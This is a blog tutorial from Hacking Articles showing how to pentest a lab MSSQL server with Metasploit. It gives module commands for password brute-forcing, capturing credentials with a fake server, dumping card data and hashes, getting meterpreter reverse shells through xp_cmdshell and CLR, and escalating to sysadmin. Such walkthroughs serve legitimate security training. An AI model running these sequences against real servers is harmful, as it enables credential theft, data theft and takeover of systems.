<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Metasploit</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentester-metasploit/" rel="bookmark"><time class="entry-date published" datetime="2021-08-30T17:18:26+00:00">August 30, 2021</time><time class="updated" datetime="2025-05-12T21:17:32+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn in detail how to pentest MSSQL servers using the Metasploit framework.</span></p>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction</span></strong></li>
<li><strong><span style="color: #000000;">Information Gathering &amp; Enumeration</span></strong>
<ul>
<li><span style="color: #000000;">Locating MSSQL Server</span></li>
<li><span style="color: #000000;">Password Cracking</span></li>
<li><span style="color: #000000;">Retrieving MSSQL version</span></li>
<li><span style="color: #000000;">MSSQL Enumeration</span></li>
<li><span style="color: #000000;">SQL Users Enumeration</span></li>
<li><span style="color: #000000;">Capturing MSSQL login</span></li>
<li><span style="color: #000000;">Creating Database</span></li>
<li><span style="color: #000000;">Dumping Database</span></li>
<li><span style="color: #000000;">SchemaDump</span></li>
<li><span style="color: #000000;">Hashdump</span></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Command Exceution</span></strong>
<ul>
<li><span style="color: #000000;">Xp_cmdshell</span></li>
<li><span style="color: #000000;">MSSQl_exec</span></li>
<li><span style="color: #000000;">CLR Assembely</span></li>
</ul>
</li>
<li><strong><span style="color: #000000;">Privilege Escalation</span></strong>
<ul>
<li><span style="color: #000000;">Public to Sysadmin</span></li>
<li><span style="color: #000000;">Impersonation</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">Metasploit is an excellent framework developed by H. D. Moore. It is a free and lightweight tool for penetration testing. It is open-source and cross-platform and has a range of features. Its popularity rests primarily on the fact that it is a powerful tool for auditing security. While this is true, it also has many features that can help people protect themselves. Personally speaking, this is my go-to tool for testing as it encapsulates the exploit a pentester can ever need. Through this article, we will learn how to use Metasploit to exploit MSSQL. Therefore, we will go through every exploit Metasploit has to offer step by step, from finding the MSSQL server in the network to retrieving the sensitive information from the database and gaining control. Without any further ado, let us begin.</span></p>
<h3><span style="color: #800000;">Information Gathering &amp; Enumeration</span></h3>
<p><span style="color: #000000;"><strong>Locating MSSQL Server</strong></span></p>
<p><span style="color: #000000;">When testing MSSQL servers, whether remotely or locally, our first requirement is to find the server in the network. And for this, we will use the following exploit in Metasploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/mssql/mssql_ping
set rhosts 192.168.1.1/24
exploit</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-MZELtRCZ5N8/YTjFQ7Z1R5I/AAAAAAAAyhE/gSOZmpshOI8BwJfx2gpb5qtlOTxNJKY6wCLcBGAsYHQ/s16000/51.png"/></strong></span></p>
<p><span style="color: #000000;"><strong>Password Cracking</strong></span></p>
<p><span style="color: #000000;">We have found the server, so our next step is to retrieve the credentials of the server. We will enforce a dictionary attack for this, with the help of the following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.1.3
set user_file /root/users.txt
set verbose false
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BI6rALVTTQU/YTjWfe__BoI/AAAAAAAAyhM/QuWMr72oIYkQCUAdpQ2ob0th91CCKrM6wCLcBGAsYHQ/s16000/52.png"/></span></p>
<p><span style="color: #000000;">And you can see in the image above, we have the credentials.</span></p>
<p><span style="color: #000000;"><strong>Retrieving MSSQL version</strong></span></p>
<p><span style="color: #000000;">We can also get all the information about the MSSQL server and its version with the help of the following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_sql
set rhosts 192.168.1.3
set username lowprwiv
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-G3_UP0VcGDk/YTjWlYtr7lI/AAAAAAAAyhQ/_uypB3whpiYnLX_haKjjvYIIc6qHGyK7gCLcBGAsYHQ/s16000/53.png"/></span></p>
<p><span style="color: #000000;">MSSQL Enumeration</span></p>
<p><span style="color: #000000;">Let’s now enumerate the server and see what all information we can get. And for this, we will use the following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_enum
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QNSZgUKp-Io/YTjWpUkYRTI/AAAAAAAAyhU/Le7BvhvqqIwkLyPe8n6H-UUEKdeafn5tACLcBGAsYHQ/s16000/54.png"/></span></p>
<p><span style="color: #000000;">As the result of the above exploit, you can see what permissions are given to the database, which logins are available with other helpful information. The same can be seen in the image above.</span></p>
<p><span style="color: #000000;"><strong>SQL Users Enumeration</strong></span></p>
<p><span style="color: #000000;">We can also find the proper login list of all the users on the server. Metasploit provides us with a particular exploit for just this task. And the exploit is the following:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_enum_sql_login
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cP6xcyvSfbI/YTjW1qNS_3I/AAAAAAAAyhc/KF24wq9w4sgSGyFcSYb7my8LJvWY_MERgCLcBGAsYHQ/s16000/55.png"/></span></p>
<p><span style="color: #000000;">And as a result, you can see in the above image that the list of all users will be provided to you.</span></p>
<p><span style="color: #000000;"><strong>Capturing MSSQL login</strong></span></p>
<p><span style="color: #000000;">The next exploit that we are going to use capture/mssql. This exploit creates a fake server and tries to capture the authenticated credentials from the original server. To use this exploit, type;</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/capture/mssql
set srvhost 192.168.1.2
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-clLehql2KFk/YTjW5-KEpcI/AAAAAAAAyhg/lb-tpJImzPkMoRF8p2J4s3knxLFd8mVGACLcBGAsYHQ/s16000/56.png"/></span></p>
<p><span style="color: #000000;">Now, if the user tries to log in to the server, for instance, we will have the credentials with the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqsh -S 192.168.1.2 -U sa -P "password@1"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JXMJ2emhcq8/YTjW_cZKsHI/AAAAAAAAyho/mWNqJL0Z0xAKWCsJYwtVFf-6F5vF-6wFACLcBGAsYHQ/s16000/57.png"/></span></p>
<p><span style="color: #000000;">And when you check your Metasploit, voila! You will have the correct login credentials of the server, which you can see in the image below as well:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m7xb6ySEgrc/YTjXED4J-DI/AAAAAAAAyhs/UeBg-KtGdxctNYNvAQqZ0G8hFDqFygYogCLcBGAsYHQ/s16000/58.png"/></span></p>
<p><span style="color: #000000;"><strong>Creating Database</strong></span></p>
<p><span style="color: #000000;">Usually, any MSSQL server that you are pentesting will have a database. But as the server on which we are performing this penetration testing is new as we also wanted to show the lab setup; therefore, for our next exploit to work, we will be creating a database in our server. To make the database, use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">create database bank;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oDqNnUNtxTc/YTjXKHblBbI/AAAAAAAAyh0/4oXaN8V5eaQT0oznPQl7FKlEmE0snfyuQCLcBGAsYHQ/s16000/59.png"/></span></p>
<p><span style="color: #000000;">As the above query execute itself successfully, our next step is to type in the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">CREATE TABLE Customers (
    CustomerID int,
    LastName varchar(255),
    FirstName varchar(255),
    passw varchar(255),
    creditcard varchar(255)
);</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-icckSCNyRTs/YTjXOToXWuI/AAAAAAAAyh4/gdvLoSGwWfYc9J5fEZ8THNC5c4M8QXAxQCLcBGAsYHQ/s16000/60.png"/></span></p>
<p><span style="color: #000000;">And so, as you can see in the image above, our table is created. Now, let’s add data to our table with the help of the following query:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">INSERT INTO Customers(CustomerID, LastName, FirstName, passw, creditcard)
VALUES ('01', 'Technologies','Ignite', 'admin123', '1111-2222-3333-4444');

INSERT INTO Customers(CustomerID, LastName, FirstName, passw, creditcard)
VALUES ('02', 'Sharma','Nisha', 'admin1234', '5555-6666-7777-8888');

INSERT INTO Customers(CustomerID, LastName, FirstName, passw, creditcard)
VALUES ('03', 'Chandel','Raj', 'admin12345', '9999-1010-1020-1030');

INSERT INTO Customers(CustomerID, LastName, FirstName, passw, creditcard)
VALUES ('04', 'Madan','Geet', 'admin12311', '1234-5678-9012-3456');</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7V8efn1VxGA/YTjXUB4NXkI/AAAAAAAAyiE/S-ztygaoU9QdrFUynvvNnJ185e9POOgUQCLcBGAsYHQ/s16000/61.png"/></span></p>
<p><span style="color: #000000;">This way, you can create your database.</span></p>
<p><span style="color: #000000;"><strong>Dumping Database</strong></span></p>
<p><span style="color: #000000;">Now that we have our database, let us learn how we can dump the content of the database with the help of Metasploit. Luckily, Metasploit has a particular exploit dedicated to dumping the content of the database. And to use the said exploit type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_findandsampledata
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
set sample_size 4
set keywords FirstName|passw|credit
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t9K7c-Ls-mk/YTjXY8Kn6WI/AAAAAAAAyiI/wn1bZ8dqVGE9prhSZy-smx4KM1DQ1l2tgCLcBGAsYHQ/s16000/62.png"/></span></p>
<p><span style="color: #000000;">Thus, using the above exploit will give the desired content of the database. For instance, the data we dumped had the information of the stored credit cards of the users.</span></p>
<p><span style="color: #000000;"><strong>SchemaDump</strong></span></p>
<p><span style="color: #000000;">The next exploit that we are going to use will dumb the schema of the server. And to use this exploit, use the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/mssql/mssql_schemadump
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mp6Ie1qZ6EA/YTjXfNa-mpI/AAAAAAAAyiQ/A5bFs-FG55oyKpaygaBBguaa84TufKOWACLcBGAsYHQ/s16000/63.png"/></span></p>
<p><span style="color: #000000;">And so, with the help of the above exploit, we have the data from the server.</span></p>
<p><span style="color: #000000;"><strong>Hashdump</strong></span></p>
<p><span style="color: #000000;">Last but not least, our next exploit is used to dump the hashes of the users from the server. To use this exploit, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/mssql/mssql_hashdump
set rhosts 192.168.1.149
set username sa
set password Password@1
expoit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EIcDjeYYaeE/YTjXmyBtgKI/AAAAAAAAyiY/1JG1DYQQ0Cc1wHimqOGQORX3eZBI6zDMgCLcBGAsYHQ/s16000/64.png"/></span></p>
<h3><span style="color: #800000;">Command Exceution</span></h3>
<p><span style="color: #000000;"><strong>Xp_cmdshell</strong></span></p>
<p><span style="color: #000000;">We found the MSSQL server in the network, retrieved the credentials, impersonated the user to have higher privileges. So now, let us try and get a meterpreter session of the server by exploit xp_cmdshell by using the following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/mssql/mssql_payload
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--dJxVGBVmek/YTjXs3xgnDI/AAAAAAAAyig/qviKfj_c2Dw7CTvbyDbNVchPGNfYqBCjACLcBGAsYHQ/s16000/65.png"/></span></p>
<p><span style="color: #000000;">As you can see in the above image, the exploit is trying to enable the xp_cmdshell to have our session. We have written a detailed article on xp_cmdshell, which you can read <a style="color: #000000;" href="https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/">here</a>. Once the xp_cmdshel is successfully enabled, we will have our meterpreter session as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7F5hTPTBYD8/YTjX1iB0sLI/AAAAAAAAyio/ptynAcEz_DADQ2xXdlg6nj2LYVPglZ3owCLcBGAsYHQ/s16000/66.png"/></span></p>
<p><span style="color: #000000;"><strong>MSSQl_exec</strong></span></p>
<p><span style="color: #000000;">Now, if we want to execute a command on the server, we can do that remotely with the help of Metasploit’s following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_exec
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
set cmd "net user"
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8bWJ6G34J4E/YTjX7_avb3I/AAAAAAAAyiw/Anas1WPrzv86lgM75c1nvuw2j_mWzLr8QCLcBGAsYHQ/s16000/67.png"/></span></p>
<p><span style="color: #000000;">And as you can see in the image above, the exploit is executed successfully, and we have our desired result, i.e., the list of all the net users.</span></p>
<p><span style="color: #000000;">Another method to execute the desired command is to first write the command in .sql file with the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat user.sql
CREATE LOGIN test1 WITH PASSWORD = 'Password@1';</pre>
<p><span style="color: #000000;"> Now we can use this .sql to run on the server, remotely, with the help of the following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_sql_file
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
set sql_file /root/user.sql
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jcsRuwXX4Cw/YTjYKxAjIXI/AAAAAAAAyjA/bYM2KloIvKETgNxSoS9QGG742zyZnwE5wCLcBGAsYHQ/s16000/68.png"/></span></p>
<p><span style="color: #000000;">And as a result, the above exploit will create a user with the name of test1. You can manually go to the server and confirm the creation of the user as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hNGgFEfqb0c/YTjYWCn8FqI/AAAAAAAAyjM/ofe92AEcGcQfsLskE1dpe53WYqb1q51GACLcBGAsYHQ/s16000/69.png"/></span></p>
<p><span style="color: #000000;"><strong>CLR Assembely</strong></span></p>
<p><span style="color: #000000;">The next exploit will help to take advantage of the CLR integration. This exploit will enable CLR integration, and along with that, it will also activate the trustworthy database property. After the exploit gives you the session, it restores all the settings to their original form. To use this exploit, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/mssql/mssql_clr_payload
set payload windows/x64/meterpreter/reverse_tcp
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AcQSMsGYasg/YTjYbYkjqOI/AAAAAAAAyjU/gXl6YG_Php0hnDnJ2oSH-gK8oKtgKjE6ACLcBGAsYHQ/s16000/70.png"/></span></p>
<p><span style="color: #000000;">And as you can see, the exploit followed all the steps to exploit CLR integration to our potential. And it gives out the meterpreter session as shown in the image above.</span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;"><strong>Public to Sysadmin</strong></span></p>
<p><span style="color: #000000;">Now that we have the user’s credentials, we can use the following exploit escalate privileges for our user. This exploit will manipulate the trustworthy property of the database and give you all the privileges you desire. And for this, we will use the following exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_escalate_dbowner
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;">Note: To deeply understand the working of this exploit, read our other article<a style="color: #000000;" href="https://www.hackingarticles.in/mssql-for-pentester-abusing-trustworthy/"> here</a>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-n27AB9zCMUo/YTjYfSNHsUI/AAAAAAAAyjY/K_W_SMsohh4P1efJSvvfeEQg7avO3-rkACLcBGAsYHQ/s16000/71.png"/></span></p>
<p><span style="color: #000000;">As you can see above, we got sysadmin privileges for our user.</span></p>
<p><span style="color: #000000;"><strong>Impersonation</strong></span></p>
<p><span style="color: #000000;">Another method to gain privileges is by impersonating another user. And the following exploit will help us do precisely that; it will let our user impersonate other users to gain sysadmin privilege. To use this exploit, use the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_escalate_execute_as
set rhosts 192.168.1.3
set username lowpriv
set password Password@1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gCrpjZLhcW0/YTjYkLZMd-I/AAAAAAAAyjc/IM7L_po_qxcEV0cfN5qv4R6as-EowX6BwCLcBGAsYHQ/s16000/72.png"/></span></p>
<p><span style="color: #000000;">Now, as you can see in the image above, the lowpriv user can impersonate sa user. Sa user is a member of sysadmin, and with the help of the above exploit, lowpriv is now a sysadmin too, as it impersonated sa user.</span></p>
<p><span style="color: #000000;">All in all, Metasploit is one of the best tools to pentest MSSQL servers as it offers so many exploits and multiple ways to do so.</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Yashika Dhir is a Cyber Security Researcher, Penetration Tester, Red Teamer, Purple Team enthusiast. Contact her on</span> <strong><a href="https://www.linkedin.com/in/yashika-dhir/">Linkedin</a> </strong><span style="color: #000000;">and </span><strong>Twitter</strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
